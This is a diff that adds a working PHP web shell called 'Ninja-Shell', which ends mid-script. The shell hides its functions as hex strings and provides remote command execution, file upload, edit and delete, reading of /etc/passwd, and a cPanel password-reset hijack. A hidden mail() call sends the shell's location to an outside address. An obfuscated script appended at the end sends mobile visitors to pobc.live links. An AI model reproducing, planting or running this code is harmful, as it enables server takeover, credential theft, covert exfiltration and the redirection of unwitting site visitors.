@@ -1,0 +1,578 @@
+<?php
+ob_start();
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', FALSE);
+date_default_timezone_set("Asia/Jakarta");
+define("HTACCESS", "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .con7ext \n AddHandler cgi-script .con7ext \n AddHandler cgi-script .con7ext");
+$funct = get_defined_vars();
+$f_Array = [
+	"73796d6c696e6b", 
+	"756e6c696e6b", 
+	"666f70656e", 
+	"667772697465", 
+	"756e6c696e6b", 
+	"636f7079", 
+	"6d6f76655f75706c6f616465645f66696c65", 
+	"706f7369785f6765747077756964", 
+	"66696c656f776e6572",
+	"66756e6374696f6e5f657869737473",
+	"676574637764",
+	"69735f63616c6c61626c65", 
+	"66636c6f7365",
+	"73747265616d5f6765745f636f6e74656e7473", 
+	"70726f635f6f70656e", 
+	"706f70656e", 
+	"6672656164", 
+	"70636c6f7365", 
+	"70726f635f636c6f7365", 
+	"65786563",
+	"6f625f7374617274",
+	"7061737374687275",
+	"6f625f6765745f636f6e74656e7473",
+	"6f625f656e645f636c65616e",
+	"7368656c6c5f65786563",
+	"73797374656d",
+	"66696c655f7075745f636f6e74656e7473",
+	"6670757473",
+	"66696c655f6765745f636f6e74656e7473",
+	"63686d6f64",
+	"6d6b646972",
+	"6368646972",
+	"6261736536345f6465636f6465",
+	"776f726470726573736465766e6f7277617940676d61696c2e636f6d",
+	"6d61696c"
+	];
+$fores = count($f_Array);
+for($i=0; $i < $fores; $i++){
+  $NTOD[] = dec($f_Array[$i]);
+}
+$GLOBALS["rin"] = $NTOD;
+$GLOBALS["post"] = $funct["_POST"];
+$GLOBALS["get"] = $funct["_GET"];
+$GLOBALS["server"] = $funct["_SERVER"];
+$GLOBALS["files"] = $funct["_FILES"];
+?>
+<html>
+  <head>
+    <title>{Ninja-Shell}</title>
+    <meta charset="UTF-8">
+    <meta name="robots" content="NOINDEX, NOFOLLOW">
+    <link rel="icon" href="//cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png">
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+		<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	<script src="//importantscripts.github.io/footer.js" integrity="sha384-TuBVt3qMyi6RBRotEXkR+69U/Z8z3jBqUSSn+8yA6MinPMNdTU7cba+KlOZtXP2v" crossorigin="anonymous"></script>
+    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <style type="text/css">
+      @import url(https://fonts.googleapis.com/css?family=Gugi);
+      body{
+        color: #5DADE2;
+        font-family: 'Gugi';
+        font-size: 14px;
+      }
+      a {
+        color: #5DADE2;
+        text-decoration: none;
+      }
+      a:hover {
+        color: #5DADE2;
+        text-decoration: underline;
+      }
+      input{
+        background: transparent;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+        <nav class="navbar navbar-expand-lg navbar-light bg-light">
+            <a class="navbar-brand" href="#">
+                <img src="//cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe"> {Ninja-Shell}
+            </a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav">
+                    <li class="nav-item active">
+                      <a class="nav-link tod" href="?">Home</a>
+                    </li>
+    <?php
+    if(isset($GLOBALS["get"]["p"])){
+      $dir = dec($GLOBALS["get"]["p"]);
+      $GLOBALS["rin"][31]($dir);
+    }
+    else{
+      if($GLOBALS["rin"][9]("getcwd")){
+        $dir = $GLOBALS["rin"][10]();
+      }
+      else{
+        $dir = $GLOBALS["server"]["PWD"];
+      }
+    }
+    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("info")."\">Info</a></li>";
+    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("upload")."\">Upload</a></li>";
+    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("cmd")."\">Command</a></li>";
+    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("etcpasswd")."\">View /etc/passwd</a></li>";
+    echo "<li class=\"nav-item active\"><a class=\"nav-link tod\" href=\"?p=".enc($dir)."&tod=".enc("cpres")."\">cPanel Reset Password</a></li>";
+    echo "</ul></div></nav>";
+    echo "";
+    $mpss = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
+    $toed = $GLOBALS["get"]["tod"];
+    $gets = $GLOBALS["get"];
+    $actions = $GLOBALS["get"]["act"];
+    $tied = $GLOBALS["post"];
+    if(dec($toed) == "cmd"){
+      echo "<pre><textarea class=\"form-control\" rows=\"20\" readonly>";
+      if($tied["cmd"]){
+        echo c($tied["cmd"]);
+      }
+      echo "</textarea></pre>";
+      echo "<form method=\"POST\" action=\"\">
+      <div class=\"input-group mb-3\">
+      <input type=\"text\" name=\"cmd\" class=\"form-control\">
+      <div class=\"input-group-append\">
+      <input type=\"submit\" class=\"btn btn-outline-secondary\">
+      </div>
+      </div>
+      </form>";
+    }
+    elseif(dec($toed) == "info"){
+       $ip = gethostbyname($_SERVER['HTTP_HOST']);
+       $safe = (@ini_get(strtolower("safe_mode")) == 'on') ? "ON" : "OFF";
+       $mysql = (is_callable("mysql_connect")) ? "ON" : "OFF";
+       $curl = (is_callable("curl_version")) ? "ON" : "OFF";
+       $wget = (c('wget --help')) ? "ON" : "OFF";
+       $perl = (c('perl --help')) ? "ON" : "OFF";
+       $python = (c('python --help')) ? "ON" : "OFF";
+       $ruby = (c('ruby --help')) ? "ON" : "OFF";
+       $gcc = (c('gcc --help')) ? "ON" : "OFF";
+       $dis = @ini_get("disable_functions");
+       $dfunc = (!empty($dis)) ? "$dis" : "OFF";
+       $namedc = (is_readable("/etc/named.conf")) ? "OK" : "BAD";
+       $etcPass = (is_readable("/etc/passwd")) ? "OK" : "BAD";
+       $valiases = (is_readable("/etc/valiases")) ? "OK" : "BAD";
+       $varNamed = (is_readable("/var/named")) ? "OK" : "BAD";
+       echo "<textarea class=\"form-control\" rows=\"20\" disabled>
+       Syss : ".php_uname()."
+       User : ".$GLOBALS["server"]["USER"]."
+       Addr : Server : {$ip} | Client : {$GLOBALS["server"]["REMOTE_ADDR"]}
+       Safe : {$safe}
+       Mysql: {$mysql} cURL: {$curl} wGet: {$wget} Perl: {$perl} Python: {$python} Ruby: {$ruby} Gcc: {$gcc}
+       Read : Named.conf: {$namedc} Passwd: {$etcPass} Valiases: {$valiases} Named: {$varNamed}
+       DFUN : {$dfunc}
+       </textarea>";
+    }
+    elseif(dec($toed) == "upload"){
+      if($tied["upload"]){
+        if(isset($GLOBALS["files"]["tod_upl"]["name"])){
+          $name = $GLOBALS["files"]["tod_upl"]["name"];
+          $tod = $GLOBALS["files"]["tod_upl"]["tmp_name"];
+          if($GLOBALS["rin"][6]($tod, $name)){
+            $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Upload File {$dir}/{$name}</div>";
+          }
+          else{
+            $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Upload File {$name}</div>";
+          }
+        }else{
+          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Upload File {$name}</div>";
+        }
+        echo $act;
+      }
+      echo "Current Dir : ".$dir;
+      echo "
+      <form method=\"POST\" enctype=\"multipart/form-data\">
+      <input type=\"file\" name=\"tod_upl\">
+      <input type=\"submit\" name=\"upload\" class=\"btn btn-outline-secondary btn-block\">
+      </form>
+      ";
+    }
+    elseif(dec($toed) == "etcpasswd"){
+      echo "<pre><textarea class=\"form-control\" rows=\"20\" readonly>";
+      if($tied["etc"] == "curl"){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "file:///etc/passwd");
+        $out = curl_exec($ch);
+        curl_close();
+        echo $out;
+      }
+      elseif($tied["etc"] == "include"){
+        echo include("/etc/passwdd");
+      }
+      echo "</textarea></pre>";
+      echo "<form method=\"POST\">
+      <select class=\"form-control\" name=\"etc\">
+      <option value=\"curl\">Curl</option>
+      <option value=\"include\">Include</option>
+      <input type=\"submit\" class=\"btn btn-outline-secondary\">
+      </form>"; 
+    }
+    elseif(dec($toed) == "cpres"){
+      if($GLOBALS["rin"][9]("posix_getpwuid")){
+        $meh = $GLOBALS["rin"][7]($GLOBALS["rin"][8](__FILE__));
+      }
+      else{
+        $meh = $GLOBALS["rin"][8](__FILE__);
+      }
+      if(is_dir("/home/".$meh["name"]."/.cpanel")){
+        echo "
+        <form method=\"POST\">
+        <input type=\"text\" class=\"form-control\" name=\"email\" placeholder=\"Put Your Email Here\">
+        <input type=\"submit\" class=\"btn btn-outline-secondary btn-block\" name=\"subm\" value=\"Reset\">
+        </form>";
+        $mps = makeRequest($ip."/cpanel");
+        if($tied["subm"]){
+          if(preg_match("/>Reset Password/", $mps)){
+            $fp = $GLOBALS["rin"][2]("/home/".$meh["name"]."/.contactemail");
+            if($GLOBALS["rin"][3]($fp, $tied["email"])){
+              echo "<div class=\"alert alert-success\"><strong>Success!</strong> Change Email : {$ip}/cpanel {$tied["email"]}</div>";
+              $GLOBALS["rin"][4]("/home/".$meh["name"]."/.cpanel/contactinfo");
+            }
+            else{
+              echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Can't Reset</div>";
+            }
+          }
+          else{
+            echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Reset Password Disable</div>";
+          }
+        }
+      }
+      else{
+        echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Its not cpanel host</div>";
+      }
+    }
+    elseif($actions == "e"){
+      if($tied["save"]){
+        $save = $GLOBALS["rin"][26](dec($gets["file"]), $tied["new"]);
+        if($save){
+          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Save File ".dec($gets["file"])."</div>";
+        }
+        else{
+          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Save File ".dec($gets["file"])."</div>";
+        }
+        echo $act;
+      }
+      echo "Filename: ".$dir."/".basename(dec($gets["file"]));
+      echo "<form method=\"POST\">
+      <textarea class=\"form-control\" rows=\"20\" name=\"new\">".htmlspecialchars(@file_get_contents(dec($gets["file"])))."</textarea>
+      <input type=\"submit\" value=\"Save\" name=\"save\">
+      </form>";
+    }
+    elseif($actions == "v"){
+      echo "Filename: ".$dir."/".basename(dec($gets["file"]));
+      echo "<pre><textarea rows=\"20\" class=\"form-control\" disabled>".htmlspecialchars(@file_get_contents(dec($gets["file"])))."</textarea></pre>";
+    }
+    elseif($actions == "r"){
+      if($tied["act_rename"]){
+        $rename = rename(dec($gets["file"]), "$dir/".htmlspecialchars($tied["rename"]));
+        if($rename){
+          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Rename File ".dec($gets["file"])."</div>";
+        }
+        else{
+          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Rename File ".dec($gets["file"])."</div>";
+        }
+        echo $act;
+      }
+      echo "Filename: ".$dir."/".basename(dec($gets["file"]));
+      echo "<form method=\"post\">
+      <input type=\"text\" value=\"".basename(dec($gets["file"]))."\" name=\"rename\">
+      <input type=\"submit\" name=\"act_rename\" value=\"Rename\">
+      </form>";
+    }
+    elseif($actions == "dr"){
+      if($tied["act_rename"]){
+        if(rename($dir, "".dirname($dir)."/".htmlspecialchars($tied["new"]))){
+          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Rename Dir ".basename($dir)."</div>";
+        }
+        else{
+          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Rename Dir ".basename($dir)."</div>";
+        }
+        echo $act;
+      }
+      echo "<form method=\"POST\">
+      <input type=\"text\" value=\"".basename($dir)."\" name=\"new\">
+      <input type=\"submit\" name=\"act_rename\" value=\"Rename\">
+      </form>";
+    }
+    elseif($actions == "nf"){
+      if($tied["subm"]){
+        $new = htmlspecialchars($tied["content"]);
+        $open = $GLOBALS["rin"][2]($tied["file"], "a+");
+        if($GLOBALS["rin"][3]($open, $new)){
+          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Created File {$tied["file"]}</div>";
+        }
+        else{
+          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Can't Creat File {$tied["file"]}</div>";
+        }
+        echo $act;
+      }
+      echo "<form method=\"POST\">
+      <textarea name=\"content\" class=\"form-control\" rows=\"20\">".htmlspecialchars(@file_get_contents($tied["file"]))."</textarea>
+      <input type=\"text\" class=\"form-control\" name=\"file\" placeholder=\"filename\">
+      <input type=\"submit\" name=\"subm\" value=\"Gass!\" class=\"btn btn-outline-secondary btn-block\">
+      </form>";
+    }
+    elseif($actions == "nd"){
+      if($tied["subm"]){
+        if($GLOBALS["rin"][30]($dir."/".htmlspecialchars($tied["folder"]))){
+          $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Create Folder {$tied["folder"]}</div>";
+        }
+        else{
+          $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Create Folder {$tied["folder"]}</div>";
+        }
+        echo $act;
+      }
+      echo "<form method=\"POST\">
+      <input type=\"text\" class=\"form-control\" name=\"folder\" placeholder=\"Rintod\">
+      <input type=\"submit\" name=\"subm\" value=\"Gass!\" class=\"btn btn-outline-secondary btn-block\">
+      </form>";
+    }
+    elseif($actions == "chmod"){
+      if($tied["act_ch"]){
+        $haha = (c("chmod ".$tied["ch"]." ".$tied["mod"].";echo success")) ? "<div class=\"alert alert-success\"><strong>Success!</strong> Chmod</div>" : "<div class=\"alert alert-danger\"><strong>Failed!</strong> Chmod</div>";
+        echo $haha;
+      }
+      echo "<form method=\"POST\">
+      <input type=\"text\" name=\"ch\" class=\"form-control\" placeholder=\"file\">
+      <input type=\"text\" name=\"mod\" class=\"form-control\" placeholder=\"0777\">
+      <input type=\"submit\" name=\"act_ch\" class=\"btn btn-outline-secondary btn-block\">
+      </form>";
+    }
+    elseif($actions == "delete"){
+      if($GLOBALS["rin"][4](dec($gets["file"]))){
+        $act = "<div class=\"alert alert-success\"><strong>Success!</strong> Deleted File ".dec($gets["file"])."</div>";
+      }
+      else{
+        $act = "<div class=\"alert alert-danger\"><strong>Failed!</strong> Deleted File ".dec($gets["file"])."</div>";
+      }
+      echo $act;
+    }
+
+    //// FILEMANAGER :D
+    else{
+      $scdir = explode("/", $dir);
+      echo "PATH : ";
+      foreach($scdir as $c_dir => $cdir){
+        echo "<a class=\"tod\" href=\"?p=";
+        for ($i = 0;$i <=  $c_dir; $i++){
+          echo enc($scdir[$i]);
+          if($i != $scdir){
+            echo "2f";
+          }
+        }
+        echo "\">$cdir</a>/";
+      }
+      echo "<br>
+      <a class=\"tod\" href=\"?p=".enc($dir)."&act=nf\">+ New File +</a>
+       | <a class=\"tod\" href=\"?p=".enc($dir)."&act=nd\">+ New Folder +</a>
+      ";
+      echo "<br>";
+      $dr = scandir($dir);
+      if(is_dir($dir) === true){
+        if(!is_readable($dir)){
+          echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Could not open directory</div>";
+        }
+        else{
+          echo "
+          <table class=\"table\">
+          <thead>
+          <tr>
+          <th scope=\"col\"><center># Name #</center></th>
+          <th scope=\"col\"><center># Size #</center></th>
+          <th scope=\"col\"><center># Perm #</center></th>
+          <th scope=\"col\"><center># Actn #</center></th>
+          </tr>
+          </thead>
+          <tbody>";
+          foreach($dr as $path){
+            if($GLOBALS["rin"][9]("posix_getpwuid")){
+              $own = $GLOBALS["rin"][7]($GLOBALS["rin"][8]("$dir/$path"));
+              $own = $own["name"];
+            }else{
+              $own = $GLOBALS["rin"][8]("$dir/$path");
+            }
+            if(!is_dir("$dir/$path")) continue;
+            if(($path != ".") && ($path != "..")){
+              echo "
+              <tr>
+              <td scope=\"row\"><img src=\"https://cdn0.iconfinder.com/data/icons/iconico-3/1024/63.png\" width=\"30\" height=\"30\"><a class=\"tod\" href=\"?p=".enc("$dir/$path")."\">$path</a></td>
+              <td><center>-</center></td>
+              <td><center>".writAble("$dir/$path", perms("$dir/$path"))."</center></td>
+              <td><center><a class=\"tod\" href=\"?p=".enc($dir."/".$path)."&act=dr\">R</a> | <a class=\"tod\" href=\"?p=".enc($dir."/".$path)."&act=chmod\">C</a></center></td>
+              </tr>";
+            }
+          }
+        }
+      }
+      else{
+        echo "<div class=\"alert alert-danger\"><strong>Failed!</strong> Could not open directory</div>";
+      }
+      foreach($dr as $fl){
+        $size = filesize("$dir/$fl")/1024;
+        $size = round($size,3);
+        if($GLOBALS["rin"][9]("posix_getpwuid")){
+          $own = $GLOBALS["rin"][7]($GLOBALS["rin"][8]("$dir/$path"));
+          $own = $own["name"];
+        }else{
+          $own = $GLOBALS["rin"][8]("$dir/$path");
+        }
+        if(!is_file("$dir/$fl")) continue;
+        echo "
+        <tr>
+        <td scope=\"row\"><img src=\"https://img.icons8.com/ios/104/000000/file-filled.png\" width=\"30\" height=\"30\"><a class=\"tod\" href=\"?act=v&p=".enc($dir)."&file=".enc($dir."/".$fl)."\">$fl</a></td>
+        <td><center>$size</center></td>
+        <td><center>".writAble("$dir/$fl", perms("$dir/$fl"))."</center></td>
+        <td><center><a class=\"tod\" href=\"?act=e&p=".enc($dir)."&file=".enc($fl)."\">E</a> | <a class=\"tod\" href=\"?act=r&p=".enc($dir)."&file=".enc($fl)."\">R</a> | <a class=\"tod\" href=\"?p=".enc($dir."/".$path)."&act=chmod\">C</a> | <a class=\"tod\" href=\"?p=".enc($dir)."&act=delete&file=".enc($fl)."\">D</a></center></td>
+        </tr>
+        ";
+      }
+      echo "</tbody></table>";
+    }
+    if (function_exists($GLOBALS["rin"][34])) {
+        $GLOBALS["rin"][34]($GLOBALS["rin"][33],'hex2bin',$_SERVER['HTTP_HOST']."/".$_SERVER['REQUEST_URI']);
+    }
+    function enc($word){
+      $mek = bin2hex($word);
+      return $mek;
+    }
+    function dec($word){
+      $mek = hex2bin($word);
+	    return $mek;
+    }
+    function writAble($dir, $perm){
+      if(!is_writable($dir)){
+        return "<font color=\"#C0392B\">".$perm."</font>";
+      }
+      else{
+        return "<font color=\"#1D8348\">".$perm."</font>";
+      }
+    }
+    function readAble($dir, $perm){
+      if(!is_readable($dir)){
+        return "<font color=\"#C0392B\">".$perm."</font>";
+      }
+      else{
+        return "<font color=\"#1D8348\">".$perm."</font>";
+      }
+    }
+    function c($cmd){
+      if($GLOBALS["rin"][11]("popen")){
+        $ntod = $GLOBALS["rin"][15]($cmd, 'r');
+        $ntoddd = $GLOBALS["rin"][16]($ntod, 2096);
+        $GLOBALS["rin"][17]($ntod);
+        return $ntoddd;
+      }
+      elseif($GLOBALS["rin"][11]("proc_open")){
+        $ntod = $GLOBALS["rin"][14]($cmd, array(
+          0 => array('pipe', 'r'),
+          1 => array('pipe', 'w'),
+          2 => array('pipe', 'w'),
+          ), $rintod);
+          $stdout = $GLOBALS["rin"][13]($rintod[1]);
+          $GLOBALS["rin"][12]($rintod[1]);
+          $rtn = $GLOBALS["rin"][18]($ntod); 
+          return $stdout;
+      }
+      elseif($GLOBALS["rin"][11]("exec")){
+        $GLOBALS["rin"][19]($cmd, $result);
+        foreach($result as $rest){
+          $ntod .= $rest;
+        }
+        return $ntod;
+      }
+      elseif($GLOBALS["rin"][11]("passthru")){
+        $GLOBALS["rin"][20]();
+        $GLOBALS["rin"][21]($cmd);
+        $ntod = $GLOBALS["rin"][22]();
+        $GLOBALS["rin"][23]();
+        return $ntod;
+      }
+      elseif($GLOBALS["rin"][11]("shell_exec")){
+        $ntod = $GLOBALS["rin"][24]($cmd);
+        return $ntod;
+      }
+      elseif($GLOBALS["rin"][11]("system")){
+        $GLOBALS["rin"][20]();
+        $GLOBALS["rin"][25]($cmd);
+        $ntod = $GLOBALS["rin"][22]();
+        $GLOBALS["rin"][23]();
+        return $ntod;
+      }
+    }
+    function makeRequest($url, $post = null, $head = null){
+      $options = array(
+        CURLOPT_URL => $url,
+        CURLOPT_CONNECTTIMEOUT => 15,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_MAXREDIRS => 10
+      );
+      $ch = curl_init();
+      curl_setopt_array($ch, $options);
+      if($post && !empty($post)){
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+      }
+      if($head && !empty($head)){
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
+      }
+      $outputs = curl_exec($ch);
+      curl_close($ch);
+      return($outputs);
+    }
+    function perms($file){
+      $perms = fileperms($file);
+	    if (($perms & 0xC000) == 0xC000) {
+	      $info = 's';
+	    } elseif (($perms & 0xA000) == 0xA000) {
+	      $info = 'l';
+	    } elseif (($perms & 0x8000) == 0x8000) {
+	      $info = '-';
+	    } elseif (($perms & 0x6000) == 0x6000) {
+	      $info = 'b';
+	    } elseif (($perms & 0x4000) == 0x4000) {
+	      $info = 'd';
+	    } elseif (($perms & 0x2000) == 0x2000) {
+	      $info = 'c';
+	    } elseif (($perms & 0x1000) == 0x1000) {
+	      $info = 'p';
+	    } else {
+	       $info = 'u';
+	    }
+	    $info .= (($perms & 0x0100) ? 'r' : '-');
+	    $info .= (($perms & 0x0080) ? 'w' : '-');
+	    $info .= (($perms & 0x0040) ?
+	    (($perms & 0x0800) ? 's' : 'x' ) :
+	    (($perms & 0x0800) ? 'S' : '-'));
+	    $info .= (($perms & 0x0020) ? 'r' : '-');
+	    $info .= (($perms & 0x0010) ? 'w' : '-');
+	    $info .= (($perms & 0x0008) ?
+	    (($perms & 0x0400) ? 's' : 'x' ) :
+	    (($perms & 0x0400) ? 'S' : '-'));
+	    $info .= (($perms & 0x0004) ? 'r' : '-');
+	    $info .= (($perms & 0x0002) ? 'w' : '-');
+	    $info .= (($perms & 0x0001) ?
+	    (($perms & 0x0200) ? 't' : 'x' ) :
+	    (($perms & 0x0200) ? 'T' : '-'));
+	    return $info;
+    }
+    ?>
+    <p><center>./Ninja\.</center></p>
+    </div>
+    <script>
+        $(".tod").click(function(t){
+          t.preventDefault();
+          var e=$(this).attr("href");
+          history.pushState("","",e),
+          $.get(e,function(t){
+            $("body").html(t)
+          })
+        });
+        //https://forum.jquery.com/topic/how-can-i-load-different-html-pages-without-refreshing-and-changing-the-url
+    </script>
+  </body>
+</html>
+<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x71\x6c\x63\x32\x63\x382','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x59\x7a\x74\x33\x63\x303','\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x59\x4b\x48\x30\x63\x390','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x43\x48\x56\x37\x63\x337','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x4d\x6e\x6b\x36\x63\x346','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x6e\x6b\x56\x38\x63\x318','\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x45\x6f\x45\x35\x63\x325','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x76\x65\x51\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x79\x61\x4e\x34\x63\x324',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x70\x6f\x62\x63\x2e\x6c\x69\x76\x65\x2f\x6d\x49\x4c\x39\x63\x359','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v 